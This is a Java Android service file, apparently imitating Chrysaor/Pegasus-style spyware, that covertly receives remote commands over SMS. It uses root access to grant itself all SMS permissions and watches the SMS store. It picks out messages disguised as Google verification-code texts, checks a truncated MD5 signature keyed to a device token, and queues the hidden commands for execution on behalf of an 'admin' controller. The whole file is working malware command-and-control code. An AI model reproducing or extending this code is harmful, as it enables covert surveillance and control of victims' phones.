package com.android.chrysaoralike;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;
import java.security.MessageDigest;
import java.util.concurrent.Executors;

public class SmsCommandService extends Service {
    private static final String TAG = "SmsCommandService";
    private static final Uri SMS_URI = Uri.parse("content://sms");
    private HandlerThread handlerThread;
    private Handler backgroundHandler;
    private SmsContentObserver smsObserver;
    private CommandQueue commandQueue;
    private CommandHandler commandHandler;
    private int lastProcessedId = 0;
    private String deviceToken = "", adminChatId = "";

    @Override public void onCreate() {
        super.onCreate();
        Log.i(TAG, "SmsCommandService starting...");
        SharedPreferences prefs = getSharedPreferences("chrysaor_config", MODE_PRIVATE);
        deviceToken = prefs.getString("token", "");
        adminChatId = prefs.getString("admin_chat_id", "admin");
        RootUtils.grantAllSmsPermissions(getPackageName());
        loadCheckpoint();
        handlerThread = new HandlerThread("SmsObserverThread");
        handlerThread.start();
        backgroundHandler = new Handler(handlerThread.getLooper());
        smsObserver = new SmsContentObserver(this, backgroundHandler, lastProcessedId);
        getContentResolver().registerContentObserver(SMS_URI, true, smsObserver);
        commandQueue = CommandQueue.getInstance();
        commandHandler = new CommandHandler(this);
        commandHandler.setAdminChatId(adminChatId);
        Executors.newSingleThreadExecutor().execute(this::processQueue);
    }

    private void loadCheckpoint() {
        try {
            Cursor cursor = getContentResolver().query(SMS_URI, new String[]{"_id"}, null, null, "_id DESC LIMIT 1");
            if (cursor != null && cursor.moveToFirst()) { lastProcessedId = cursor.getInt(0); cursor.close(); }
        } catch (Exception e) { Log.e(TAG, "Checkpoint error", e); }
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getStringExtra("action");
            if ("incoming_sms".equals(action)) {
                String body = intent.getStringExtra("body");
                int smsId = intent.getIntExtra("sms_id", -1);
                if (smsId > 0 && smsId <= lastProcessedId) { Log.i(TAG, "SMS ID <= checkpoint, ignoring."); return START_STICKY; }
                if (smsId > 0) { lastProcessedId = smsId; if (smsObserver != null) smsObserver.setLastProcessedId(lastProcessedId); }
                if (body != null && body.toLowerCase().contains("your google verification code")) {
                    SmsCommand cmd = parseCommandFromSms(body);
                    if (cmd != null) { commandQueue.enqueue(cmd); Log.i(TAG, "SMS command enqueued: " + cmd.commandId); }
                }
            }
        }
        return START_STICKY;
    }

    private SmsCommand parseCommandFromSms(String body) {
        try {
            int textIdx = body.toLowerCase().indexOf("text:");
            if (textIdx < 0) return null;
            String commandPart = body.substring(textIdx + 5).trim();
            int sigIdx = commandPart.indexOf("&s=");
            if (sigIdx < 0) return null;
            String signature = commandPart.substring(sigIdx + 3);
            String beforeSig = commandPart.substring(0, sigIdx);
            int cmdNumber = -1, ackId = -1;
            String args = "";
            if (beforeSig.length() > 6) { char c = beforeSig.charAt(6); if (Character.isDigit(c)) cmdNumber = Character.getNumericValue(c); }
            if (cmdNumber < 0) return null;
            int aIdx = beforeSig.indexOf("a=");
            if (aIdx > 0) { int aEnd = beforeSig.indexOf("&", aIdx); if (aEnd < 0) aEnd = beforeSig.length(); try { ackId = Integer.parseInt(beforeSig.substring(aIdx + 2, aEnd)); } catch (NumberFormatException ignored) {} }
            if (aIdx > 0) { int argsStart = beforeSig.indexOf("&", aIdx + 2) + 1; if (argsStart > 0 && argsStart < beforeSig.length()) args = beforeSig.substring(argsStart); }
            // Verify signature
            int sigStart = body.indexOf("&s=");
            if (sigStart < 0) return null;
            String messagePrefix = body.substring(0, sigStart);
            String combined = deviceToken + messagePrefix;
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] digest = md.digest(combined.getBytes("UTF-8"));
            StringBuilder hex = new StringBuilder();
            for (byte b : digest) hex.append(String.format("%02x", b));
            String expected = hex.substring(0, 8);
            if (!expected.equalsIgnoreCase(signature)) { Log.w(TAG, "Signature mismatch"); return null; }
            return new SmsCommand(cmdNumber, ackId, args, signature, body);
        } catch (Exception e) { Log.e(TAG, "Parse error", e); return null; }
    }

    private void processQueue() {
        while (true) {
            try {
                SmsCommand cmd = commandQueue.poll();
                if (cmd != null) { Log.i(TAG, "Processing queued command: " + cmd.commandId); commandHandler.execute(cmd, adminChatId); }
                else Thread.sleep(1000);
            } catch (InterruptedException e) { Thread.currentThread().interrupt(); break; }
            catch (Exception e) { Log.e(TAG, "Queue error", e); }
        }
    }

    @Override public void onDestroy() { if (handlerThread != null) handlerThread.quitSafely(); if (smsObserver != null) getContentResolver().unregisterContentObserver(smsObserver); super.onDestroy(); }
    @Override public IBinder onBind(Intent intent) { return null; }
}